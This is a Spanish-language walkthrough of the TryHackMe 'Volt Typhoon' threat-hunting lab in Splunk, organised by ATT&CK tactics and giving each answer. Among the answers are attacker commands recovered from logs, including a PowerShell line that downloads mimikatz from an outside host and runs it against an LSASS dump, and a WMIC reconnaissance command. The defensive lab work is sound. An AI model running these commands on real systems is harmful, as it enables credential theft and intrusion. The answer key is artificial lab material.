# 🕵️ Volt Typhoon - Threat Hunting con Splunk | TryHackMe

## 📅 Estructura de la investigación
### El SOC dectectó actividad sospechosa sobre el grupo APT  `Volt Typhoon`, conocido por atacar a organizaciones de alto valor. Se nos asigna investigar la intrusión y los pasos del atacante. Este desafío está basado en la estructura del framework ATT&CK de MITRE.
----
## 🌐 1. Initial Access

### 🔢 Revisar los registros de `ADSelfService Plus` para rastrear los pasos del atacante. ¿A qué hora (formato ISO 8601) cambió la contraseña de Dean y el atacante se apropió de su cuenta?
### ✅ `2024-03-24T11:10:22`

![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/01.png)

### Poco después de que la cuenta de Dean fuera comprometida, el atacante creó una nueva cuenta de administrador. ¿Cómo se llama la nueva cuenta creada?
En un momento, me pregunté: Por qué buscar Enrollment y no Account Unlock? Investigando en Google encontré que cuando se crea una cuenta nueva, el atacante debe registrarla primero. Por lo tanto, el evento es "Enrollment".
### ✅ `voltyp-admin`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/02.png)
---

## ⚙️ 2. Execution

### Táctica 👉 Living Off the Land (WMIC, CMD)
### ¿Qué comando ejecuta el atacante para encontrar información sobre las unidades locales en server01 y server02?
### ✅ `wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/03.png)

---
### 🔐 Contraseña del archivo:


### El atacante usa ntdsutil para crear una copia de la base de datos de AD. Tras transferir el archivo a un servidor web, el atacante comprime la base de datos. ¿Qué contraseña establece el atacante en el archivo comprimido?
Detectado en logs de `7z` al comprimir `temp.dit` en un archivo con password.
### ✅ `d5ag0nm@5t3r`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/03b1.png)

---

## 🔒 3. Persistence

### Táctica 👉 Web Shells encubiertos
### Para establecer la persistencia en el servidor comprometido, el atacante creó un shell web con texto codificado en base64. ¿En qué directorio se encontraba el shell web?
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/03b.png)

---

## 🔫 4. Defense Evasion

### 🔢 Eliminación de registros RDP:
### Para intentar ocultar sus huellas, los atacantes eliminan la evidencia de la vulneración. Primero borran los registros RDP. ¿Qué cmdlet de PowerShell utiliza el atacante para eliminar el registro "Usado más recientemente"?  
### ✅ `Remove-ItemProperty`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/05a.png)

### 🔄 Renombrado de archivos exfiltrados
### El APT continúa ocultando sus huellas renombrando y modificando la extensión del archivo previamente creado. ¿Cuál es el nombre del archivo (con extensión) creado por los atacantes?
### ✅ `cl64.gif`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/05b.png)

### ¿En qué ruta de registro busca el atacante evidencia de un entorno virtualizado?
### ✅ `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/05C.png)

---

## 🔐 5. Credential Access

### Para intentar ocultar sus huellas, los atacantes eliminan la evidencia de la vulneración. Primero borran los registros RDP. ¿Qué cmdlet de PowerShell utiliza el atacante para eliminar el registro "Usado más recientemente"?
### ✅ `OpenSSH, putty, realvnc`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/06A.png)
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/06A1.png)


### 🔢 ¿Cuál es el comando completamente decodificado que utiliza el atacante para descargar y ejecutar mimikatz?
### ✅ `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/06B.png)
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/06C.png)

## 📜 6. Discovery & Lateral Movement

### 🔢 Enumeración de logs:
### El atacante usa wevtutil, una herramienta de recuperación de registros, para enumerar los registros de Windows. ¿Qué identificadores de evento busca el atacante?
### ✅ `4624 4625 4769`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/07A.png)

### 🔢 Moviéndose lateralmente al servidor 02, el atacante copia el shell web original. ¿Cómo se llama el nuevo shell web creado?
### ✅ `AuditReport.jspx`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/08.png)

---

## 📃 7. Collection

### 🔢 El atacante logra localizar información financiera valiosa durante la fase de recopilación. ¿De qué tres archivos copia Volt Typhoon mediante PowerShell?
### ✅ `2022.csv 2023.csv 2024.csv`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/09.png)

---

## 🔌 8. C2 & Cleanup

### 🔢 El atacante usa netsh para crear un proxy para las comunicaciones C2. ¿Qué dirección de conexión y puerto usa el atacante al configurar el proxy?
Formato de la respuesta: IP Puerto
### ✅ `10.2.30.1 8443`
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/10.png)

### 🔢 Para ocultar sus actividades, ¿cuáles son los cuatro tipos de registros de eventos que el atacante borra en el sistema comprometido?
![](https://github.com/JoshKxng/SOC-Analyst-TryHackMe/blob/main/imagenes/Splunk%20-%20Volt%20Typhoon/11.png)

---

# 🎖️ Conclusión
## Fue un desafío bastante complejo, donde más allá de la técnica, tuve que buscar desde distintos ángulos, y sobre todo, a no frustrarme si no encuentro la solución desde mi punto de vista inicial. LLevó unas cuantas horas completarlo, pero a la larga, cuando ves la cantidad de apuntes que llevas escritos en tu cuaderno para entender mejor lo que estás haciendo y como usarlo para futuras investigaciones, es ahí cuando sentís lo enriquecedor que es el proceso.

